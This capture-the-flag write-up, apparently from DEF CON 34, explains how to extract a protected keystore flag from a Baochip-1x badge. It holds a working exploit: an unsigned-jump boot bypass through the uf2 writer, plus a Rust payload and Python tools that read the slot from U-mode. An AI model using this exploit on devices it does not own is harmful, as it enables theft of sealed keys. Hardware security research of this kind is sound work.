THE_FLAG_1: how we got it, explained from scratch

No prior chip-hacking knowledge assumed. This walks through what the badge is, why it refuses to hand over its secrets, the exact flaw that makes it hand them over anyway, and how to repeat it yourself without damaging your badge. Every file you need is included at the bottom.

Part 1 · What you are dealing with

The DEF CON 34 badge is a small computer. At its heart is a chip called Baochip-1x, running a processor design called RISC-V. It has a little screen, a couple of buttons, and, importantly, a built-in safe.

The safe is a region of memory called the keystore: 2048 numbered slots, 32 bytes each. Some hold the badge's serial number, some hold cryptographic keys, and one, slot 260, named THE_FLAG_1 in the source code, holds the flag. The chip has hardware that physically refuses to let the wrong code read the protected slots. Not "returns an error". The read just silently comes back as zeros.

Four terms you will need

Boot chain
When you power the badge on, four programs run one after another: boot0 hands off to boot1, which hands off to the loader, which starts the operating system (Xous). Each one checks the next before running it.
Signature check
That check is a digital signature, the same idea as a wax seal. The manufacturer computes a fingerprint of the program and signs it with a private key. Before running that program, the badge recomputes the fingerprint and verifies the signature. Change one byte of a signed program and the check fails.
Privilege modes
RISC-V processors run code at one of three trust levels: M-mode (machine, total control, no restrictions), S-mode (supervisor, for an operating system kernel), and U-mode (user, for ordinary apps). This distinction turns out to be the whole trick.
RRAM
The chip's built-in permanent storage, 4 megabytes of it, holding all four boot programs. Unlike normal RAM it survives power-off. Its addresses start at 0x6000_0000.

Part 2 · The flaw

Here is the situation. The loader is a program sitting in RRAM. Before running it, boot1 verifies its signature. But the signature does not cover the whole program. It covers everything from byte 132 onward. The first 132 bytes are deliberately left out, because that space holds the signature itself and some bookkeeping.

The problem is what sits at byte 0 of those unsigned bytes: a jump instruction. And that jump instruction is the very first thing the processor executes once the signature check passes.

The flaw in one sentence

The badge carefully verifies the book, then follows the table of contents, which is not part of the book it verified. Rewrite the table of contents and it will happily jump to a chapter you wrote.

Two more facts turn that from a curiosity into a working exploit:

  1. You can write those bytes. Boot1 has a maintenance command called uf2 that writes data to RRAM. It performs no signature check at the time of writing. The check happens later, at boot, and only covers bytes 132 onward. So writing over the jump instruction is completely permitted.
  2. You only need to write 4 bytes. RRAM writes go through a read-modify-write cycle on a 32-byte block, so poking 4 bytes leaves the signature bytes next door untouched. The signature still validates.

Run that jump into your own code and you are executing in M-mode, full control of the chip, on a badge that never left its locked "Sealed" state.

Part 3 · The part that stumped us for a day

M-mode is total control, so you would expect to just read slot 260 and be done. You cannot. The keystore's hardware guard does not care how privileged you are. It cares which identity is asking, and it works that identity out from the memory-management settings.

The source explains it, in a comment at boot1/src/secboot.rs:17 describing what the lockdown function does:

The comment

"...locks out future modifications to the Coreuser setting. Also inverts mm sense, which means you must enter a virtual memory user state to access sealed keys."

We read "user state" as "not machine mode" and tested S-mode exhaustively. It returned zeros every time. We concluded the protection had held, and were wrong for most of a day. In RISC-V, S-mode is supervisor. "User" means U-mode specifically, the lowest and least privileged level.

And it has to be U-mode with the address-space identifier (ASID) set to 3, because that is the identity the badge's own legitimate keystore program runs under. You are not breaking the guard. You are using M-mode to construct exactly the user-mode context the guard is built to trust, then walking through the front door.

Why this was so easy to get wrong

A denied read returns zeros and does not fault. That looks identical to a bug in your own code. You cannot tell "the chip refused me" from "my toolchain is broken" unless you read something you already know the answer to, in the same breath. Build that control into every single run.

Part 4 · Before you touch the badge

Read this twice. It is the one unrecoverable mistake.

Never enter developer mode. It is a one-way door. It erases the badge's secrets, including THE_FLAG_1 and the shared light-exchange key, and there is no way back. Holding a face button at cold boot reaches boot1 update mode, a completely different and perfectly safe state, but verify which one you are in before typing anything (step 03).

What you need:

  • A Baosec-lite badge with removable AA cells, and a USB-C cable.
  • Rust, with the riscv32imac-unknown-none-elf target installed.
  • Python, with pyserial (to talk to the badge) and pillow (to decode photos).
  • A phone camera. This is not a joke. The screen is the only way data gets out: the serial port is not wired to the outside on this carrier board, the programmable-I/O buffers are cleared at boot, and USB is shut down before the loader runs (boot1/src/main.rs:390-392). So the payload draws bytes on the OLED as a grid of black and white squares, and you photograph them.

Part 5 · Procedure

  1. Get the source that matches your badge

    This matters more than it sounds. The flaw has since been fixed upstream, so if you read the current code you will be looking at a badge that does not exist. Check your badge's own version banner, then create a worktree, a second checkout of the repository parked at that older commit, so you can read exactly what is running.

    git -C repos/xous-core worktree add ./../xous-BADGE 8964027ff   # Xous v0.10.1-43
git -C repos/xous-core worktree add ./../xous-BOOT1 bcfdca404   # boot1 v0.10.1-0

  2. Build your payload, and check where it lands

    Your program goes at address 0x6009_0000, a gap of free space between the end of the loader and the start of the operating system image.

    The operating system begins at 0x6009_9000 (offsets/common.rs:13). If your program is big enough to reach that address, you overwrite the OS and brick the badge. Do not eyeball this. Make the build fail instead. That is what the two asserts in elf2bin.py below are for.

    cargo build --release
python elf2bin.py target/riscv32imac-unknown-none-elf/release/dc34-payload payload.bin

  3. Get into boot1 update mode

    Take both AA cells out, unplug USB, wait about 30 seconds, then hold any face button while you plug USB back in.

    The cells genuinely have to come out. There is a flag called warm_boot (bao1x-api/src/lib.rs:71-77) that gets set every time the OS starts, and it clears only when the chip fully loses power. While it is set, boot1/src/main.rs:180 boots straight through and ignores your button.

    Now check you are in the right place. The badge should appear on USB as Baochip_1x. If it says Baosec_lite, it booted normally, so start over. Type echo hello at the prompt and you should get hello back.

  4. Upload your program

    uf2 takes base64-encoded chunks over the USB serial port and writes them into RRAM. Nothing checks a signature here.

    python uf2send.py file 0x60090000 payload.bin

  5. Redirect the jump

    This is the exploit itself: one 4-byte write. 0x0003006F is the RISC-V encoding of "jump forward 0x30000 bytes", which is exactly the distance from the loader's start to your program.

    python uf2send.py word 0x60060000 0003006F
    Optional, but worth doing once

    Before running a real payload, write j . (jump to yourself, an infinite loop) instead. The badge goes totally dark, no USB. That single observation proves your code ran: if the signature check had failed, boot1 would have printed "Image did not validate" and dropped you back to the update prompt (boot1/src/main.rs:182). Silence means the check passed and your instruction executed.

  6. Power cycle, no button this time

    boot0, then boot1, then signature verified, then jr t0 into your code, in machine mode, on a sealed badge.

  7. Drop to U-mode at ASID 3 and read the slot

    Three things happen here. You build a page table that maps memory one-to-one with the user-accessible bit set. You point satp, the register that controls address translation, at that table with ASID 3. Then you use mret to "return" into user mode, which is how a RISC-V machine deliberately hands control to less privileged code.

    for i in 0..1024 { pt[i] = (i << 20) | 0xDF; }   // 0xDF sets D|A|U|X|W|R|V; U = user-accessible

csrw mtvec, {trap}          // where to land when we come back
csrw medeleg, zero          // see the pitfalls table. not optional.
csrw mideleg, zero
csrw stvec, {trap}
sfence.vma
csrw satp, {satp}           // 0x80C61000 = Sv32 paging | ASID 3 | table address
sfence.vma
li   t0, 0x1800
csrc mstatus, t0            // clear MPP to 00 = return to U-mode. NOT 01, which is S-mode.
csrw mepc, {u_phase}
mret

    Now, in user mode, read 32 bytes from 0x603E_2080, which is DATA_SLOT_START + 260 × 32. Also read the serial-number slot as your control. Checksum both on-chip. Then ecall to bounce back to machine mode, which is where you are allowed to drive the display hardware.

  8. Photograph the screen and decode

    The payload draws eight bytes per screen as an 8 by 8 grid of squares, each 12 pixels with a 14-pixel spacing, inset 8 pixels from the edge. It also draws a 2-pixel lit border around the whole panel so the decoder can find the corners in a hand-held photo, plus small blobs along the top edge counting off which page you are looking at.

    Hold each page about 3 seconds. Our first attempt cycled at roughly 6 Hz and was completely unphotographable.

    Page 2 is the control. On this unit it must decode to exactly . Pages 3 to 6 are the flag. If the control is wrong, throw the whole photo set away. Do not try to salvage the flag pages from it.

    python decode.py page*.jpg
python assemble.py <p3> <p4> <p5> <p6>

  9. Put the badge back

    Cold boot into update mode again and restore the original jump instruction. 0x3000006F is what the build system originally generated there.

    python uf2send.py word 0x60060000 3000006F

    Next power cycle, the badge boots normally. Nothing in the badge's file storage was ever touched, so your saved data and any custom splash image are exactly where you left them.

Part 6 · Things that will waste a boot cycle

Every one of these cost us at least one attempt. A boot cycle is roughly five minutes of pulling batteries and waiting, so they add up fast.

What you will seeWhat is actually wrongFix
Screen stays blank, badge seems dead Boot1 leaves the trap-delegation registers set to all ones (boot1/src/platform/bao1x/irq.rs:50-51) and never restores them. Your own ecall gets routed to an address that was never initialised. Clear medeleg and mideleg before mret
Variables contain nonsense There is no C runtime on this path, so the zero-initialised data section (.bss) is never actually zeroed. Your "empty" variables hold whatever was in RAM. Zero __sbss to __ebss yourself in _start
Screen looks like a photo negative clear() fills the buffer with all ones, so on this panel a 0 bit is lit Invert your rendering
Everything reads as zeros, no error The keystore denied you. It does this silently. Always read a known value alongside
Control page decodes fine, flag is still zeros You are in S-mode, not U-mode MPP = 00, not 01
Pages flicker too fast to photograph spin(30_000_000) is about 0.09 seconds Use spin(400_000_000), roughly 3 seconds
Decode looks plausible but is subtly wrong Your sampling grid is off by one whole cell, which silently inserts a byte Measure your offset search in cells, not pixels, and trust only a CRC match
The trap that got us twice. Please do not repeat it.

The serial-number slot is marked PartitionAccess::Open, which means everyone can read it. Reading it successfully proves your user-mode context is alive. It does not prove you can read protected slots. We validated the technique against the open slot, generalised the result to the protected slot, and wrote a wrong conclusion into two documents before catching it.

The rule that came out of it: your control has to be in the same permission class as the thing you are claiming to read. Otherwise it is not a control, it is a comfort blanket.

// src/main.rs -- stage-2 payload: read THE_FLAG_1 from U-mode at ASID 3.
#![no_std]
#![no_main]
use core::panic::PanicInfo;
#[panic_handler]
fn panic(_i: &PanicInfo) -> ! { loop { core::hint::spin_loop() } }

const CLKTOP_HZ:  u32   = 700_000_000;
const SLOT_BASE:  usize = 0x603E_0000;                // DATA_SLOT_START
const fn slot(n: usize) -> usize { SLOT_BASE + n * 32 }
const FLAG_ADDR:  usize = slot(260);                  // THE_FLAG_1, PartitionAccess::Fw0
const UUID_ADDR:  usize = slot(1);                    // Open. LIVENESS control only.
const PT_ADDR:    usize = 0x6100_0000;                // page table, 4 KiB aligned
const SATP:       u32   = (1 << 31)                   // MODE = Sv32
                        | (3 << 22)                   // ASID = 3  (the keystore service)
                        | ((PT_ADDR as u32) >> 12);   // PPN

static mut RES_F:   [u8; 32] = [0; 32];
static mut RES_U:   [u8; 32] = [0; 32];
static mut FAULTED: u32      = 0;

// Nothing else zeroes .bss on this link path: there is no C runtime here.
core::arch::global_asm!(
    ".section .text.entry, \"ax\"",
    ".global _start",
    "_start:",
    "  la   sp, _stack_top",
    "  la   t0, __sbss",
    "  la   t1, __ebss",
    "1:  bgeu t0, t1, 2f",
    "  sw   zero, 0(t0)",
    "  addi t0, t0, 4",
    "  j    1b",
    "2:  j payload_main",
);

// mcause 8 = ecall from U-mode (our clean finish). Anything else is a real fault,
// so latch a flag and still get to the screen: a silent hang tells you nothing.
core::arch::global_asm!(
    ".section .text, \"ax\"",
    ".align 4",
    ".global trap_entry",
    "trap_entry:",
    "  csrr t2, mcause",
    "  li   t3, 8",
    "  beq  t2, t3, 1f",
    "  li   t3, 9",
    "  beq  t2, t3, 1f",
    "  la   t0, {faulted}",
    "  li   t1, 1",
    "  sw   t1, 0(t0)",
    "1:",
    "  li   t0, 0x1800",
    "  csrs mstatus, t0",          // MPP = 11, back to machine mode
    "  la   sp, _stack_top",
    "  la   t0, render",
    "  csrw mepc, t0",
    "  mret",
    faulted = sym FAULTED,
);
unsafe extern "C" { fn trap_entry(); }

/// Runs in U-mode with satp.ASID = 3. This is the whole trick.
#[unsafe(no_mangle)]
pub unsafe extern "C" fn u_phase() -> ! {
    unsafe {
        let f = core::ptr::addr_of_mut!(RES_F) as *mut u8;
        let u = core::ptr::addr_of_mut!(RES_U) as *mut u8;
        for i in 0..32 {
            core::ptr::write_volatile(f.add(i),
                core::ptr::read_volatile((FLAG_ADDR + i) as *const u8));
            core::ptr::write_volatile(u.add(i),
                core::ptr::read_volatile((UUID_ADDR + i) as *const u8));
        }
        core::arch::asm!("ecall", options(noreturn));
    }
}

#[unsafe(no_mangle)]
pub extern "C" fn payload_main() -> ! {
    unsafe {
        // Sv32 identity map, 4 MiB megapages. 0xDF = D|A|U|X|W|R|V.
        // The U bit is what lets user mode touch these pages at all.
        let pt = PT_ADDR as *mut u32;
        for i in 0..1024usize {
            core::ptr::write_volatile(pt.add(i), ((i as u32) << 20) | 0xDF);
        }
        core::arch::asm!(
            "csrw mtvec, {tv}",
            // boot1 leaves medeleg/mideleg at 0xFFFFFFFF (irq.rs:50-51) and never
            // restores them. Without this, our own ecall is delivered to an
            // uninitialised stvec and the badge hangs with a blank screen.
            "csrw medeleg, zero",
            "csrw mideleg, zero",
            "csrw stvec, {tv}",
            "sfence.vma",
            "csrw satp, {satp}",
            "sfence.vma",
            "li   t0, 0x1800",
            "csrc mstatus, t0",        // MPP = 00 -> U-mode.  01 would be S-mode: reads zeros.
            "csrw mepc, {e}",
            "mret",
            tv   = in(reg) trap_entry as usize,
            satp = in(reg) SATP,
            e    = in(reg) u_phase as usize,
            out("t0") _,
        );
    }
    loop { core::hint::spin_loop() }
}

#[unsafe(no_mangle)]
pub extern "C" fn render() -> ! {
    unsafe { core::arch::asm!("csrw satp, zero", "sfence.vma"); }
    let iox  = bao1x_hal::iox::Iox::new(utralib::utra::iox::HW_IOX_BASE as *mut u32);
    let udma = bao1x_hal::udma::GlobalConfig::new();
    let mut oled = open_oled(&iox, &udma);

    let (f, u, fault) = unsafe {
        (*core::ptr::addr_of!(RES_F),
         *core::ptr::addr_of!(RES_U),
         core::ptr::read_volatile(core::ptr::addr_of!(FAULTED)))
    };
    let c = crc32(&f);
    // Page 1: CRC32 of the flag, its first 3 bytes, and the fault latch.
    // CRC 190a55ad means all zeros, i.e. the read was denied.
    let p1 = [(c >> 24) as u8, (c >> 16) as u8, (c >> 8) as u8, c as u8,
              f[0], f[1], f[2], fault as u8];
    loop {
        draw_page8(oled.buffer_mut(), &p1, 1);        oled.redraw().ok(); spin(400_000_000);
        draw_page8(oled.buffer_mut(), &u[0..8], 2);   oled.redraw().ok(); spin(400_000_000);
        for p in 0..4usize {
            draw_page8(oled.buffer_mut(), &f[p*8..p*8+8], p + 3);
            oled.redraw().ok(); spin(400_000_000);
        }
    }
}

/// Eight bytes as an 8x8 grid: 12 px cells on a 14 px pitch, inset 8 px, MSB left.
/// Plus a 2 px lit border (registration) and `tag` blobs in the top margin (page id).
/// NOTE the polarity: clear() fills 0xFFFF_FFFF, so a 0 bit is LIT.
fn draw_page8(fb: &mut [u32], eight: &[u8], tag: usize) {
    for w in fb.iter_mut() { *w = 0xFFFF_FFFF; }
    let lit = |x: usize, y: usize| {
        if x < 128 && y < 128 {
            let b = x + y * 128;
            fb[b / 32] &= !(1u32 << (b % 32));
        }
    };
    for i in 0..128usize { for t in 0..2usize {
        lit(i, t); lit(i, 127 - t); lit(t, i); lit(127 - t, i);
    }}
    for k in 0..tag.min(8) { for dy in 3..7usize { for dx in 0..6usize {
        lit(20 + k * 11 + dx, dy);
    }}}
    for (row, &byte) in eight.iter().enumerate() {
        for bit in 0..8usize {
            if (byte >> (7 - bit)) & 1 == 0 { continue; }
            for dy in 0..12usize { for dx in 0..12usize {
                lit(8 + bit * 14 + dx, 8 + row * 14 + dy);
            }}
        }
    }
}

fn spin(n: u32) { for _ in 0..n { core::hint::spin_loop() } }

fn crc32(d: &[u8]) -> u32 {
    let mut c: u32 = 0xFFFF_FFFF;
    for &b in d {
        c ^= b as u32;
        for _ in 0..8 { let m = (c & 1).wrapping_neg(); c = (c >> 1) ^ (0xEDB8_8320 & m); }
    }
    !c
}

fn open_oled<'a>(iox: &'a bao1x_hal::iox::Iox, udma: &'a bao1x_hal::udma::GlobalConfig)
    -> bao1x_hal::sh1107::Oled128x128<'a>
{
    use bao1x_hal::sh1107::{MainThreadToken, Oled128x128};
    use utralib::*;
    let sysctrl = CSR::new(utra::sysctrl::HW_SYSCTRL_BASE as *mut u32);
    let fd = sysctrl.r(utra::sysctrl::SFR_CGUFDPER) & 0xFF;
    let perclk = bao1x_hal::clocks::divide_by_fd(fd, CLKTOP_HZ) / 2;
    let mut o = Oled128x128::new(MainThreadToken::new(), perclk, iox, udma);
    o.init().ok();
    o
}
elf2bin.pyflatten ELF, refuse to brick
#!/usr/bin/env python3
"""elf2bin.py -- flatten the payload ELF, and refuse to produce one that bricks.

  python elf2bin.py target/riscv32imac-unknown-none-elf/release/dc34-payload payload.bin

There is no objcopy in this toolchain install, and there does not need to be:
the loadable segments are all we want. The two asserts are the point of the file.
"""
import struct, sys

KERNEL_START = 0x60099000    # offsets/common.rs:13 -- xous.img begins here
ENTRY        = 0x60090000

src, dst = sys.argv[1], sys.argv[2]
d = open(src, 'rb').read()
assert d[:4] == b'\x7fELF' and d[4] == 1, "not a 32-bit ELF"
entry, phoff = struct.unpack_from('<II', d, 24)
phentsize, phnum = struct.unpack_from('<HH', d, 42)

segs = []
for i in range(phnum):
    o = phoff + i * phentsize
    typ, off, vaddr, paddr, filesz, memsz, flags, align = struct.unpack_from('<8I', d, o)
    if typ == 1 and filesz > 0:          # PT_LOAD with real bytes.
        segs.append((vaddr, off, filesz))   # a filesz of 0 is .bss: it lives in RAM,
                                            # and including it would inflate the image
                                            # by the whole RAM origin offset.
base = min(s[0] for s in segs)
top  = max(s[0] + s[2] for s in segs)
out = bytearray(top - base)
for vaddr, off, filesz in segs:
    out[vaddr - base:vaddr - base + filesz] = d[off:off + filesz]

print(f"entry=0x{entry:08x} base=0x{base:08x} end=0x{top:08x} size={len(out)}")
assert entry == ENTRY and base == ENTRY, "payload must start exactly at 0x60090000"
assert top < KERNEL_START, (
    f"payload ends at 0x{top:08x}, at or past KERNEL_START 0x{KERNEL_START:08x}. "
    "Writing this would overwrite xous.img and brick the badge.")
open(dst, 'wb').write(out)
print(f"OK: {KERNEL_START - top} bytes of headroom below KERNEL_START")

"""uf2send.py -- write RRAM through boot1's update-mode `uf2` command.

  uf2send.py word <addr-hex> <value-hex>     one 32-bit little-endian word
  uf2send.py file <addr-hex> <path>          a binary blob, chunked
  uf2send.py --dry ...                       print records, send nothing

The guards below are not paranoia. boot1 itself lives at 0x60000000-0x6005FFFF,
and update mode is inside boot1. Corrupt that and there is no way back in:
it is the single unrecoverable action in this whole exercise.
"""
import base64, glob, struct, sys, time
import serial

FAMILY   = 0xA7D76373
RRAM     = 0x60000000
MIN_ADDR = 0x60060000          # LOADER_START. Never write below this.
MAX_ADDR = RRAM + 0x3DA000     # HW_RERAM_MEM + RRAM_STORAGE_LEN
KERNEL   = 0x60099000          # KERNEL_START: xous.img. Never reach this.
CHUNK    = 256                 # bytes per record (max 476)

def uf2(addr, payload, blkno, nblk):
    b = struct.pack('<8I', 0x0A324655, 0x9E5D5157, 0x00002000, addr,
                    len(payload), blkno, nblk, FAMILY)
    b += payload + b'\x00' * (476 - len(payload))
    return b + struct.pack('<I', 0x0AB16F30)

def check(addr, n):
    if addr % 4:
        sys.exit(f"REFUSING: {addr:#x} is not 4-byte aligned")
    if addr < MIN_ADDR:
        sys.exit(f"REFUSING: {addr:#x} is below LOADER_START. That is boot0/boot1, "
                 "and corrupting it is unrecoverable: update mode lives there.")
    if addr < KERNEL <= addr + n:
        sys.exit(f"REFUSING: {addr:#x}+{n} crosses KERNEL_START {KERNEL:#x}. "
                 "That would overwrite xous.img and brick the badge.")
    if addr + n > MAX_ADDR:
        sys.exit(f"REFUSING: {addr:#x}+{n} exceeds RRAM storage {MAX_ADDR:#x}")

args = [a for a in sys.argv[1:] if a != "--dry"]
DRY  = "--dry" in sys.argv
if len(args) != 3:
    sys.exit(__doc__)
mode, addr_s, val = args
addr = int(addr_s, 16)
if mode == "word":
    data = struct.pack('<I', int(val, 16))
elif mode == "file":
    data = open(val, 'rb').read()
    if len(data) % 4:
        data += b'\x00' * (4 - len(data) % 4)
else:
    sys.exit(__doc__)

check(addr, len(data))
nblk = (len(data) + CHUNK - 1) // CHUNK
recs = [uf2(addr + i*CHUNK, data[i*CHUNK:(i+1)*CHUNK], i, nblk) for i in range(nblk)]
print(f"[plan] {len(data)} bytes -> {nblk} record(s), {addr:#x}..{addr+len(data):#x}")
if DRY:
    for r in recs:
        print("uf2 " + base64.b64encode(r).decode())
    sys.exit(0)

ports = sorted(glob.glob("/dev/cu.usbmodem*"))
if not ports:
    sys.exit("no serial port found")
s = serial.Serial(ports[0], 115200, timeout=3)
s.write(b"\r\n"); time.sleep(0.3); s.reset_input_buffer()

acked = 0
for i, r in enumerate(recs):
    s.write(b"uf2 " + base64.b64encode(r) + b"\r\n")
    deadline = time.time() + 3
    while time.time() < deadline:            # scan for the ack; log lines share this stream
        line = s.readline().decode(errors="replace")
        if "OK" in line or "ok" in line:
            acked += 1
            break
    print(f"\r  {i+1}/{nblk} acked={acked}", end="", flush=True)
print(f"\n[done] {acked}/{nblk} records acknowledged")
if acked != nblk:
    sys.exit("NOT every record was acknowledged. Do not power cycle. Retry the write.")

#!/usr/bin/env python3
"""decode.py -- turn a phone photo of one payload page into 8 bytes.

  python decode.py page1.jpg [page2.jpg ...]

The payload draws a 2 px lit border around the whole panel. That border is the
only reason hand-held photos work: it pins the origin and the scale, so cell
bloom can no longer walk the sampling grid off by a row.

Sampling geometry must match draw_page8() exactly:
  cells 8 x 8, pitch 14 px, 12 px lit core, inset 8 px, MSB leftmost.
"""
import sys, itertools
from PIL import Image, ImageFilter

CONTROL_PAGE2 = ""   # UUID slot, this unit. Liveness check only.


def find_frame(im):
    """Bounding box of the lit border, tried over several crops and thresholds."""
    w, h = im.size
    for (a, b, c, d) in [(0.12, 0.08, 0.94, 0.94), (0.05, 0.05, 0.98, 0.98)]:
        X0, Y0, X1, Y1 = int(w*a), int(h*b), int(w*c), int(h*d)
        sub = im.crop((X0, Y0, X1, Y1)); sw, sh = sub.size; px = sub.load()
        for thr in (210, 190, 170, 150, 130, 110, 90):
            rows = [sum(1 for x in range(0, sw, 2) if px[x, y] > thr) for y in range(sh)]
            cols = [sum(1 for y in range(0, sh, 2) if px[x, y] > thr) for x in range(sw)]
            if max(rows) == 0 or max(cols) == 0:
                continue
            def edges(p):
                m = max(p); hot = [i for i, v in enumerate(p) if v > 0.55 * m]
                return hot[0], hot[-1]
            ry0, ry1 = edges(rows); cx0, cx1 = edges(cols)
            wp, hp = cx1 - cx0, ry1 - ry0
            # the panel is square, so reject anything wildly off-aspect
            if wp > 150 and hp > 150 and 0.72 < wp / hp < 1.40:
                return [X0 + cx0, X0 + cx1, Y0 + ry0, Y0 + ry1]
    return None


def sample(im, frame, off):
    """Rectify to 128x128 (x3 supersample) and read the 64 cells."""
    x0, x1, y0, y1 = frame
    a, b, c, d = off
    up = 3; N = 128 * up
    quad = (x0+a, y0+b,  x0+a, y1+d,  x1+c, y1+d,  x1+c, y0+b)
    # rotate(270): the badge is photographed on its side
    disp = im.transform((N, N), Image.QUAD, quad, Image.BICUBIC).rotate(270)
    p = disp.load()

    def box(X, Y, r):
        t = n = 0
        for dy in range(-r, r+1):
            for dx in range(-r, r+1):
                t += p[min(N-1, max(0, X+dx)), min(N-1, max(0, Y+dy))]; n += 1
        return t / n

    vals = [box((8 + col*14 + 6)*up, (8 + row*14 + 6)*up, 4*up)
            for row in range(8) for col in range(8)]
    lo, hi = min(vals), max(vals)
    thr = (lo + hi) / 2
    # margin: how close the least-confident cell sits to the threshold.
    # Maximising it is how we pick the right grid alignment.
    margin = min(abs(v - thr) for v in vals) / max(1e-9, hi - lo)
    bits = [1 if v > thr else 0 for v in vals]
    out = bytes(sum(bits[i*8 + j] << (7 - j) for j in range(8)) for i in range(8))
    return out, margin


def decode(path):
    im = Image.open(path).convert("L").filter(ImageFilter.MedianFilter(3))
    frame = find_frame(im)
    if frame is None:
        return None, 0.0
    cw = (frame[1] - frame[0]) * 14 / 128.0     # one cell, in photo pixels
    ch = (frame[3] - frame[2]) * 14 / 128.0
    # Search sub-cell offsets. Getting this wrong by one whole cell silently
    # inserts a byte, which looks like plausible data. Ask how large your
    # search step is in CELLS, never in pixels.
    best = None
    for k in itertools.product([-0.5, -0.25, 0, 0.25, 0.5], repeat=4):
        off = (k[0]*cw, k[1]*ch, k[2]*cw, k[3]*ch)
        out, margin = sample(im, frame, off)
        if best is None or margin > best[1]:
            best = (out, margin)
    return best


for path in sys.argv[1:]:
    out, margin = decode(path)
    if out is None:
        print(f"{path}: frame not found, reshoot with the whole panel in view")
        continue
    tag = ""
    if out.hex() == CONTROL_PAGE2:
        tag = "  <- page 2 control EXACT"
    print(f"{path}  margin={margin:.2f}  {out.hex()}{tag}")

#!/usr/bin/env python3
"""assemble.py -- stitch four decoded pages into the 32-byte flag and check it.

  python assemble.py <page4hex> <page5hex> <page6hex> <page7hex> <crc32hex>

The badge computed that CRC over the bytes it actually read, before they ever
became pixels. If it matches, the photo pipeline is proven end to end. If it
does not, reshoot; do not hand-patch a nibble because it "looks close".
"""
import sys, zlib

pages, expect = sys.argv[1:5], int(sys.argv[5], 16)
flag = b"".join(bytes.fromhex(p) for p in pages)
got = zlib.crc32(flag) & 0xFFFFFFFF

print("flag  =", flag.hex())
print(f"crc32 = 0x{got:08x}   on-chip = 0x{expect:08x}")
print("VERIFIED" if got == expect else "MISMATCH: reshoot the pages")

if flag == bytes(32):
    print("all zeros: the keystore denied the read. You were in S-mode, not U-mode.")

Part 8 · What this does and does not do to your badge

  • Everything is read-only except two writes: the 4-byte jump redirect, and your program in free space. Both get reverted in step 09.
  • No writes to the access-control memory, the one-way counters, or the external flash chip.
  • The badge stays Sealed the whole time. Ours reported Paranoid 0/0 and Possible attacks 0 after roughly a dozen deploy-and-restore cycles, with the light gene and all counters intact.
  • Developer mode is never involved, so the secret-erasing policy never triggers.
